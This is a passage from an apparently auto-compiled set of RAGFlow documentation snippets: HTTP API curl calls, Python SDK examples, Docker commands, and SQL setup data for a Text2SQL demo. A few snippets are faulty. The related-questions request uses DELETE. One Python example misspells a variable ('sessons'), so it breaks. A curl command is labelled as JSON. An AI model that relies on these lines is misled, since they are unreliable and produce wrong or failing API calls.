Requires dataset ID and document ID in the URL path.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/datasets/{dataset_id}/documents/{document_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --output ./ragflow.txt\n```\n\n----------------------------------------\n\nTITLE: Deleting Datasets API Request\nDESCRIPTION: Example curl command to delete one or more datasets by their IDs\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/datasets \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '{\n     \"ids\": [\"test_1\", \"test_2\"]\n     }'\n```\n\n----------------------------------------\n\nTITLE: Creating Agent Session without Parameters (Bash)\nDESCRIPTION: This curl command creates a new agent session when the Begin component does not take parameters. It sends a POST request to the completions endpoint with an empty JSON body.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_49\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n     }'\n```\n\n----------------------------------------\n\nTITLE: Deleting Agent Sessions with RAGFlow SDK\nDESCRIPTION: Method to delete specific or all sessions associated with an agent. Takes an optional list of session IDs as parameter, and will delete all sessions if no IDs are provided.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_38\n\nLANGUAGE: python\nCODE:\n```\nAgent.delete_sessions(ids: list[str] = None)\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nAGENT_id = \"AGENT_ID\"\nagent = rag_object.list_agents(id = AGENT_id)[0]\nagent.delete_sessions(ids=[\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Deleting Chat Assistant Sessions in RAGFlow Python SDK\nDESCRIPTION: Method for deleting specific sessions of a chat assistant by their IDs. If no IDs are provided, all sessions associated with the assistant will be deleted.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_28\n\nLANGUAGE: python\nCODE:\n```\nChat.delete_sessions(ids:list[str] = None)\n```\n\n----------------------------------------\n\nTITLE: Executing Agent Completion (Bash)\nDESCRIPTION: This curl command executes the completion process for an existing agent session. It sends a POST request to the completions endpoint with a JSON body containing the question, stream option, and session ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_51\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/agents/{agent_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n          \"question\": \"Hello\",\n          \"stream\": true,\n          \"session_id\": \"cb2f385cb86211efa36e0242ac120005\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Listing Agent Sessions in RAGFlow Python SDK\nDESCRIPTION: Method for listing sessions associated with an agent. Supports pagination, sorting, and filtering by ID. Returns a list of Session objects or an Exception on failure.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_36\n\nLANGUAGE: python\nCODE:\n```\nAgent.list_sessions(\n    page: int = 1, \n    page_size: int = 30, \n    orderby: str = \"update_time\", \n    desc: bool = True,\n    id: str = None\n) -> List[Session]\n```\n\n----------------------------------------\n\nTITLE: Deleting Chat Assistants with RAGFlow SDK in Python\nDESCRIPTION: This snippet demonstrates how to delete chat assistants using their IDs. It shows the usage of the delete_chats method from the RAGFlow SDK.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_22\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nrag_object.delete_chats(ids=[\"id_1\",\"id_2\"])\n```\n\n----------------------------------------\n\nTITLE: Listing Agent Sessions (Bash)\nDESCRIPTION: This curl command retrieves a list of sessions associated with a specified agent. It sends a GET request to the sessions endpoint with optional query parameters for pagination and sorting.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_56\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/agents/{agent_id}/sessions?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&id={session_id}&user_id={user_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Listing Agents with RAGFlow SDK\nDESCRIPTION: Method to retrieve a list of agents with pagination, sorting, and filtering options. Returns a list of Agent objects that can be further manipulated.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_39\n\nLANGUAGE: python\nCODE:\n```\nRAGFlow.list_agents(\n    page: int = 1, \n    page_size: int = 30, \n    orderby: str = \"create_time\", \n    desc: bool = True,\n    id: str = None,\n    title: str = None\n) -> List[Agent]\n```\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nfor agent in rag_object.list_agents():\n    print(agent)\n```\n\n----------------------------------------\n\nTITLE: Session Deletion Error Response\nDESCRIPTION: Shows the error response format when a user attempts to delete a session that doesn't belong to the specified agent.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_60\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"The agent doesn't own the session cbd31e52f73911ef93b232903b842af6\"\n}\n```\n\n----------------------------------------\n\nTITLE: Session Deletion Success Response\nDESCRIPTION: Shows the successful response format when deleting sessions, consisting of just a status code indicating success.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_59\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Documents Asynchronously in RAGFlow SDK (Python)\nDESCRIPTION: Initiates asynchronous parsing of specified documents in a RAGFlow dataset. This function starts the parsing process for multiple documents identified by their IDs.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.create_dataset(name=\"dataset_name\")\ndocuments = [\n    {'display_name': 'test1.txt', 'blob': open('./test_data/test1.txt',\"rb\").read()},\n    {'display_name': 'test2.txt', 'blob': open('./test_data/test2.txt',\"rb\").read()},\n    {'display_name': 'test3.txt', 'blob': open('./test_data/test3.txt',\"rb\").read()}\n]\ndataset.upload_documents(documents)\ndocuments = dataset.list_documents(keywords=\"test\")\nids = []\nfor document in documents:\n    ids.append(document.id)\ndataset.async_parse_documents(ids)\nprint(\"Async bulk parsing initiated.\")\n```\n\n----------------------------------------\n\nTITLE: Authentication Error Response\nDESCRIPTION: Shows the error response format when a request is made with invalid or missing authentication credentials.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_64\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 401,\n    \"data\": null,\n    \"message\": \"<Unauthorized '401: Unauthorized'>\"\n}\n```\n\n----------------------------------------\n\nTITLE: Generate Related Questions Request Example\nDESCRIPTION: Shows how to make a POST request to generate alternative questions based on an original user query, including authentication and request body structure.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_62\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request DELETE \\\n     --url http://{address}/api/v1/conversation/related_questions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"question\": \"What are the key advantages of Neovim over Vim?\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Listing Agent Sessions Example in RAGFlow\nDESCRIPTION: Example showing how to retrieve an agent by ID and list its sessions using the RAGFlow SDK.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_37\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nAGENT_id = \"AGENT_ID\"\nagent = rag_object.list_agents(id = AGENT_id)[0]\nsessons = agent.list_sessions()\nfor session in sessions:\n    print(session)\n```\n\n----------------------------------------\n\nTITLE: List Agents Request Example\nDESCRIPTION: Demonstrates how to make a GET request to list agents with various filtering and pagination parameters, including authentication.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_65\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request GET \\\n     --url http://{address}/api/v1/agents?page={page}&page_size={page_size}&orderby={orderby}&desc={desc}&name={agent_name}&id={agent_id} \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>'\n```\n\n----------------------------------------\n\nTITLE: Related Questions Success Response\nDESCRIPTION: Shows the successful response format for generating related questions, including a list of alternative question phrasings based on the original query.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_63\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 0,\n    \"data\": [\n        \"What makes Neovim superior to Vim in terms of features?\",\n        \"How do the benefits of Neovim compare to those of Vim?\",\n        \"What advantages does Neovim offer that are not present in Vim?\",\n        \"In what ways does Neovim outperform Vim in functionality?\",\n        \"What are the most significant improvements in Neovim compared to Vim?\",\n        \"What unique advantages does Neovim bring to the table over Vim?\",\n        \"How does the user experience in Neovim differ from Vim in terms of benefits?\",\n        \"What are the top reasons to switch from Vim to Neovim?\",\n        \"What features of Neovim are considered more advanced than those in Vim?\"\n    ],\n    \"message\": \"success\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Session with an Agent Example in RAGFlow\nDESCRIPTION: Example showing how to retrieve an agent by ID and create a session with it using the RAGFlow SDK.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_33\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow, Agent\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\nagent_id = \"AGENT_ID\"\nagent = rag_object.list_agents(id = agent_id)[0]\nsession = agent.create_session()\n```\n\n----------------------------------------\n\nTITLE: Error Response Structure in RAGFlow API\nDESCRIPTION: Demonstrates the error response format when an agent is not found in the system. Contains an error code and descriptive message.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_67\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 102,\n    \"message\": \"The agent doesn't exist.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Dataset API Request\nDESCRIPTION: Example curl command to update an existing dataset's configuration\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ncurl --request PUT \\\n     --url http://{address}/api/v1/datasets/{dataset_id} \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data '\n     {\n          \"name\": \"updated_dataset\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Listing Chat Assistant Sessions in RAGFlow Python SDK\nDESCRIPTION: Method for listing sessions associated with a chat assistant. Supports pagination, sorting, and filtering by ID or name. Returns a list of Session objects or an Exception on failure.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nChat.list_sessions(\n    page: int = 1, \n    page_size: int = 30, \n    orderby: str = \"create_time\", \n    desc: bool = True,\n    id: str = None,\n    name: str = None\n) -> list[Session]\n```\n\n----------------------------------------\n\nTITLE: Failed Document Upload Response (JSON)\nDESCRIPTION: Example of an error response when document upload fails due to missing file part.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/http_api_reference.md#2025-04-10_snippet_12\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"code\": 101,\n    \"message\": \"No file part!\"\n}\n```\n\n----------------------------------------\n\nTITLE: HTTP API Example for Passing Variables to RAGFlow Chat\nDESCRIPTION: Example cURL command demonstrating how to pass a custom variable 'style' with value 'hilarious' when making a request to the RAGFlow HTTP API.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/chat/set_chat_variables.md#2025-04-10_snippet_1\n\nLANGUAGE: json\nCODE:\n```\ncurl --request POST \\\n     --url http://{address}/api/v1/chats/{chat_id}/completions \\\n     --header 'Content-Type: application/json' \\\n     --header 'Authorization: Bearer <YOUR_API_KEY>' \\\n     --data-binary '\n     {\n          \"question\": \"xxxxxxxxx\",\n          \"stream\": true,\n          \"style\":\"hilarious\"\n     }'\n```\n\n----------------------------------------\n\nTITLE: Adding Chunks to Documents in RAGFlow SDK (Python)\nDESCRIPTION: Adds a chunk of text content to a document in RAGFlow. Optionally allows specifying important keywords for the chunk. Returns a Chunk object representing the added chunk.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_13\n\nLANGUAGE: python\nCODE:\n```\nDocument.add_chunk(content:str, important_keywords:list[str] = []) -> Chunk\n```\n\n----------------------------------------\n\nTITLE: Checking Ollama Accessibility\nDESCRIPTION: Commands to verify Ollama accessibility from different contexts\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/models/deploy_local_llm.mdx#2025-04-10_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nsudo docker exec -it ragflow-server bash\ncurl  http://host.docker.internal:11434/\n```\n\nLANGUAGE: bash\nCODE:\n```\ncurl  http://localhost:11434/\n```\n\nLANGUAGE: bash\nCODE:\n```\ncurl  http://${IP_OF_OLLAMA_MACHINE}:11434/\n```\n\n----------------------------------------\n\nTITLE: Creating Database Tables for Text2SQL Agent in MySQL\nDESCRIPTION: SQL script to create tables for Customers, Products, Orders, and OrderDetails in a MySQL database. This schema sets up the structure for an e-commerce database to be used with the Text2SQL agent.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSET NAMES utf8mb4;\n\n-- ----------------------------\n-- Table structure for Customers\n-- ----------------------------\nDROP TABLE IF EXISTS `Customers`;\nCREATE TABLE `Customers` (\n  `CustomerID` int NOT NULL AUTO_INCREMENT,\n  `UserName` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  `Email` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  `PhoneNumber` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  PRIMARY KEY (`CustomerID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n-- ----------------------------\n-- Table structure for Products\n-- ----------------------------\nDROP TABLE IF EXISTS `Products`;\nCREATE TABLE `Products` (\n  `ProductID` int NOT NULL AUTO_INCREMENT,\n  `ProductName` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,\n  `Description` text COLLATE utf8mb4_unicode_ci,\n  `Price` decimal(10,2) DEFAULT NULL,\n  `StockQuantity` int DEFAULT NULL,\n  PRIMARY KEY (`ProductID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n-- ----------------------------\n-- Table structure for Orders\n-- ----------------------------\nDROP TABLE IF EXISTS `Orders`;\nCREATE TABLE `Orders` (\n  `OrderID` int NOT NULL AUTO_INCREMENT,\n  `CustomerID` int DEFAULT NULL,\n  `OrderDate` date DEFAULT NULL,\n  `TotalPrice` decimal(10,2) DEFAULT NULL,\n  PRIMARY KEY (`OrderID`),\n  KEY `CustomerID` (`CustomerID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n\n-- ----------------------------\n-- Table structure for OrderDetails\n-- ----------------------------\nDROP TABLE IF EXISTS `OrderDetails`;\nCREATE TABLE `OrderDetails` (\n  `OrderDetailID` int NOT NULL AUTO_INCREMENT,\n  `OrderID` int DEFAULT NULL,\n  `ProductID` int DEFAULT NULL,\n  `UnitPrice` decimal(10,2) DEFAULT NULL,\n  `Quantity` int DEFAULT NULL,\n  `TotalPrice` decimal(10,2) DEFAULT NULL,\n  PRIMARY KEY (`OrderDetailID`),\n  KEY `OrderID` (`OrderID`),\n  KEY `ProductID` (`ProductID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;\n```\n\n----------------------------------------\n\nTITLE: Updating Dataset Configuration with RAGFlow\nDESCRIPTION: Example of updating a dataset's configuration using the RAGFlow SDK. It demonstrates retrieving a dataset and updating its embedding model and chunk method.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_5\n\nLANGUAGE: python\nCODE:\n```\nfrom ragflow_sdk import RAGFlow\n\nrag_object = RAGFlow(api_key=\"<YOUR_API_KEY>\", base_url=\"http://<YOUR_BASE_URL>:9380\")\ndataset = rag_object.list_datasets(name=\"kb_name\")\ndataset = dataset[0]\ndataset.update({\"embedding_model\":\"BAAI/bge-zh-v1.5\", \"chunk_method\":\"manual\"})\n```\n\n----------------------------------------\n\nTITLE: Setting Opener for Text2SQL Agent in RAGFlow\nDESCRIPTION: This snippet provides the opener text to be set in the Begin component of the Text2SQL Agent.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_7\n\nLANGUAGE: plaintext\nCODE:\n```\nHi! I'm your electronic products online store business data analysis assistant. What can I do for you?\n```\n\n----------------------------------------\n\nTITLE: Example of Tag Set File Structure\nDESCRIPTION: Format specification for tag table files (XLSX, CSV, or TXT) showing the required columns - Description and Tag, where Description contains example chunks or queries, and Tag contains comma-separated tags.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/use_tag_sets.md#2025-04-10_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nTable structure:\n- Description (Column 1): Contains example chunks or queries\n- Tag (Column 2): Contains comma-separated tags\n```\n\n----------------------------------------\n\nTITLE: Listing Datasets with RAGFlow\nDESCRIPTION: Examples of listing datasets using the RAGFlow SDK. It includes cases for listing all datasets and retrieving a specific dataset by ID.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nfor dataset in rag_object.list_datasets():\n    print(dataset)\n\ndataset = rag_object.list_datasets(id = \"id_1\")\nprint(dataset[0])\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image With Embedding Models\nDESCRIPTION: Commands to build a full version of RAGFlow Docker image including embedding models\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ko.md#2025-04-10_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build -f Dockerfile -t infiniflow/ragflow:nightly .\n```\n\n----------------------------------------\n\nTITLE: Configuring a Knowledge Base in RAGFlow\nDESCRIPTION: This image shows the configuration page for a knowledge base in RAGFlow. It illustrates various settings and options available for customizing the knowledge base.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/dataset/configure_knowledge_base.md#2025-04-10_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n![knowledge base configuration](https://github.com/infiniflow/ragflow/assets/93570324/384c671a-8b9c-468c-b1c9-1401128a9b65)\n```\n\n----------------------------------------\n\nTITLE: Creating Chat Completion with OpenAI-Compatible API\nDESCRIPTION: Example of using the OpenAI-compatible API to create a chat completion. It demonstrates setting up the client, sending messages, and handling both streamed and non-streamed responses.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/references/python_api_reference.md#2025-04-10_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nfrom openai import OpenAI\n\nmodel = \"model\"\nclient = OpenAI(api_key=\"ragflow-api-key\", base_url=f\"http://ragflow_address/api/v1/chats_openai/<chat_id>\")\n\ncompletion = client.chat.completions.create(\n    model=model,\n    messages=[\n        {\"role\": \"system\", \"content\": \"You are a helpful assistant.\"},\n        {\"role\": \"user\", \"content\": \"Who are you?\"},\n    ],\n    stream=True\n)\n\nstream = True\nif stream:\n    for chunk in completion:\n        print(chunk)\nelse:\n    print(completion.choices[0].message.content)\n```\n\n----------------------------------------\n\nTITLE: Starting RAGFlow Server with Docker Compose\nDESCRIPTION: Commands to start RAGFlow server using Docker Compose for both CPU and GPU configurations\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_ko.md#2025-04-10_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ cd ragflow/docker\n# Use CPU for embedding and DeepDoc tasks:\n$ docker compose -f docker-compose.yml up -d\n\n# To use GPU to accelerate embedding and DeepDoc tasks:\n# docker compose -f docker-compose-gpu.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Docker Compose Restart Command\nDESCRIPTION: Command to restart Docker containers after configuration changes\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/configurations.md#2025-04-10_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ndocker compose -f docker/docker-compose.yml up -d\n```\n\n----------------------------------------\n\nTITLE: Configuring LLM Prompt for Thesaurus in RAGFlow Text2SQL Agent\nDESCRIPTION: This snippet shows the additional prompt content to be added to the LLM's configuration to provide thesaurus information for SQL generation.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_6\n\nLANGUAGE: plaintext\nCODE:\n```\n## You may use the following Thesaurus statements. For example, what I ask is from Synonyms, you must use Standard noun to generate SQL. Use responses to past questions also to guide you: {sql_thesaurus}.\n```\n\n----------------------------------------\n\nTITLE: Building RAGFlow Docker Image from Source (Slim Version)\nDESCRIPTION: Docker build command to create a slim version of the RAGFlow image without embedding models.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/README_zh.md#2025-04-10_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ngit clone https://github.com/infiniflow/ragflow.git\ncd ragflow/\ndocker build --build-arg LIGHTEN=1 --build-arg NEED_MIRROR=1 -f Dockerfile -t infiniflow/ragflow:nightly-slim .\n```\n\n----------------------------------------\n\nTITLE: Managing RAGFlow Docker Containers - Cleanup Commands\nDESCRIPTION: Bash commands to stop and remove all RAGFlow related Docker containers and resources.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/faq.mdx#2025-04-10_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncd ragflow/docker/\ndocker compose down\n```\n\n----------------------------------------\n\nTITLE: Inserting Test Data into SQL Database Tables\nDESCRIPTION: This SQL script inserts sample data into Customers, Products, Orders, and OrderDetails tables. It also updates the TotalPrice in the Orders table based on OrderDetails.\nSOURCE: https://github.com/infiniflow/ragflow/blob/main/docs/guides/agent/text2sql_agent.md#2025-04-10_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSTART TRANSACTION;\nINSERT INTO Customers (UserName, Email, PhoneNumber) VALUES\n('Alice', 'alice@example.com', '123456789'),\n('Bob', 'bob@example.com', '987654321'),\n('Charlie', 'charlie@example.com', '112233445'),\n('Diana', 'diana@example.com', '555666777'),\n('Eve', 'eve@example.com', '999888777'),\n('Frank', 'frank@example.com', '123123123'),\n('Grace', 'grace@example.com', '456456456'),\n('Hugo', 'hugo@example.com', '789789789'),\n('Ivy', 'ivy@example.com', '321321321'),\n('Jack', 'jack@example.com', '654654654');\n\nINSERT INTO Products (ProductName, Description, Price, StockQuantity) VALUES\n('Laptop', 'High performance laptop', 1200.00, 50),\n('Smartphone', 'Latest model smartphone', 800.00, 100),\n('Tablet', 'Portable tablet device', 300.00, 75),\n('Headphones', 'Noise-cancelling headphones', 150.00, 200),\n('Camera', 'Professional camera', 600.00, 30),\n('Monitor', '24-inch Full HD monitor', 200.00, 45),\n('Keyboard', 'Mechanical keyboard', 100.00, 150),\n('Mouse', 'Ergonomic gaming mouse', 50.00, 250),\n('Speaker', 'Wireless Bluetooth speaker', 80.00, 120),\n('Router', 'Wi-Fi router with high speed', 120.00, 90);\n\nINSERT INTO Orders (CustomerID, OrderDate, TotalPrice) VALUES\n(1, '2024-01-15', 0),\n(2, '2024-02-01', 0),\n(3, '2024-03-05', 0),\n(4, '2024-04-10', 0),\n(5, '2024-05-15', 0),\n(6, '2024-06-20', 0),\n(7, '2024-07-25', 0),\n(8, '2024-08-30', 0),\n(9, '2024-09-05', 0),\n(10, '2024-10-10', 0),\n(1, '2024-11-15', 0),\n(2, '2024-12-01', 0),\n(3, '2024-01-05', 0),\n(4, '2024-02-10', 0),\n(5, '2024-03-15', 0),\n(6, '2024-04-20', 0),\n(7, '2024-05-25', 0),\n(8, '2024-06-30', 0),\n(9, '2024-07-05', 0),\n(10, '2024-08-10', 0);\n\nINSERT INTO OrderDetails (OrderID, ProductID, UnitPrice, Quantity, TotalPrice) VALUES\n(1, 1, (SELECT Price FROM Products WHERE ProductID = 1), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 1)), \n(1, 2, (SELECT Price FROM Products WHERE ProductID = 2), 1, (SELECT Price FROM Products WHERE ProductID = 2)),\n(2, 3, (SELECT Price FROM Products WHERE ProductID = 3), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 3)),\n(2, 4, (SELECT Price FROM Products WHERE ProductID = 4), 1, (SELECT Price FROM Products WHERE ProductID = 4)),\n(3, 5, (SELECT Price FROM Products WHERE ProductID = 5), 1, (SELECT Price FROM Products WHERE ProductID = 5)),\n(3, 6, (SELECT Price FROM Products WHERE ProductID = 6), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 6)),\n(4, 7, (SELECT Price FROM Products WHERE ProductID = 7), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 7)),\n(5, 8, (SELECT Price FROM Products WHERE ProductID = 8), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 8)),\n(5, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),\n(6, 10, (SELECT Price FROM Products WHERE ProductID = 10), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 10)),\n(7, 2, (SELECT Price FROM Products WHERE ProductID = 2), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 2)),\n(7, 8, (SELECT Price FROM Products WHERE ProductID = 8), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 8)),\n(8, 1, (SELECT Price FROM Products WHERE ProductID = 1), 1, (SELECT Price FROM Products WHERE ProductID = 1)),\n(8, 9, (SELECT Price FROM Products WHERE ProductID = 9), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 9)),\n(8, 10, (SELECT Price FROM Products WHERE ProductID = 10), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 10)),\n(9, 3, (SELECT Price FROM Products WHERE ProductID = 3), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 3)),\n(9, 6, (SELECT Price FROM Products WHERE ProductID = 6), 1, (SELECT Price FROM Products WHERE ProductID = 6)),\n(10, 4, (SELECT Price FROM Products WHERE ProductID = 4), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 4)),\n(10, 7, (SELECT Price FROM Products WHERE ProductID = 7), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 7)),\n(11, 5, (SELECT Price FROM Products WHERE ProductID = 5), 1, (SELECT Price FROM Products WHERE ProductID = 5)),\n(11, 10, (SELECT Price FROM Products WHERE ProductID = 10), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 10)),\n(12, 1, (SELECT Price FROM Products WHERE ProductID = 1), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 1)),\n(12, 8, (SELECT Price FROM Products WHERE ProductID = 8), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 8)),\n(13, 2, (SELECT Price FROM Products WHERE ProductID = 2), 1, (SELECT Price FROM Products WHERE ProductID = 2)),\n(13, 9, (SELECT Price FROM Products WHERE ProductID = 9), 3, (SELECT Price * 3 FROM Products WHERE ProductID = 9)),\n(14, 3, (SELECT Price FROM Products WHERE ProductID = 3), 4, (SELECT Price * 4 FROM Products WHERE ProductID = 3)),\n(14, 6, (SELECT Price FROM Products WHERE ProductID = 6), 2, (SELECT Price * 2 FROM Products WHERE ProductID = 6)),\n(15, 4, (SELECT Price FROM Products WHERE ProductID = 4), 5, (SELECT Price * 5 FROM Products WHERE ProductID = 4)),\n(15, 7, (SELECT Price FROM Products WHERE ProductID = 7), 1, (SELECT Price 